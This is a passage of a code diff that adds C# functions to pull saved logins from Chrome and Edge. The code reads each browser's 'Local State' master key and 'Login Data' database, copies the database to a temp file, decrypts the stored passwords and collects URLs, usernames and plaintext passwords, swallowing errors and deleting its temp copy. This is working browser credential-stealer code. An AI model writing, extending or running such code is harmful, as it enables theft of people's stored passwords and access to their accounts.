+                    passwords = passwords,
+                    count = passwords.Count
+                };
+            }
+            catch (Exception ex) 
+            { 
+                Log($"Chrome extraction error: {ex.Message}");
+                return new { error = ex.Message }; 
+            }
+        }
+
+        static object ExtractEdgeData()
+        {
+            try
+            {
+                var localAppData = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
+                var edgePath = Path.Combine(localAppData, @"Microsoft\Edge\User Data");
+                var keyPath = Path.Combine(edgePath, "Local State");
+                var dbPath = Path.Combine(edgePath, @"Default\Login Data");
+
+                if (!File.Exists(keyPath) || !File.Exists(dbPath))
+                    return new { error = "Edge files not found" };
+
+                var masterKey = GetMasterKey(keyPath);
+                var passwords = GetBrowserPasswords(dbPath, masterKey);
+
+                return new
+                {
+                    passwords = passwords,
+                    count = passwords.Count
+                };
+            }
+            catch (Exception ex) 
+            { 
+                Log($"Edge extraction error: {ex.Message}");
+                return new { error = ex.Message }; 
+            }
+        }
+
+        static List<object> GetBrowserPasswords(string dbPath, byte[] masterKey)
+        {
+            var results = new List<object>();
+            
+            var tempDb = Path.GetTempFileName();
+            File.Copy(dbPath, tempDb, true);
+
+            try
+            {
+                using var conn = new SqliteConnection($"Data Source={tempDb}");
+                conn.Open();
+                using var cmd = conn.CreateCommand();
+                cmd.CommandText = "SELECT origin_url, username_value, password_value FROM logins";
+                using var reader = cmd.ExecuteReader();
+                while (reader.Read())
+                {
+                    var url = reader.GetString(0);
+                    var username = reader.GetString(1);
+                    var encryptedPass = (byte[])reader["password_value"];
+                    
+                    if (string.IsNullOrEmpty(username) || encryptedPass == null || encryptedPass.Length == 0) continue;
+                    
+                    try 
+                    {
+                        var password = DecryptPassword(encryptedPass, masterKey);
+                        if(!string.IsNullOrEmpty(password) && !password.StartsWith("Err"))
+                        {
+                            results.Add(new { url, username, password });
+                        }
+                    }
+                    catch {}
+                }
+            }
+            finally
+            {
+                try { File.Delete(tempDb); } catch { }
+            }
+            
+            return results;
+        }
+    }
+}
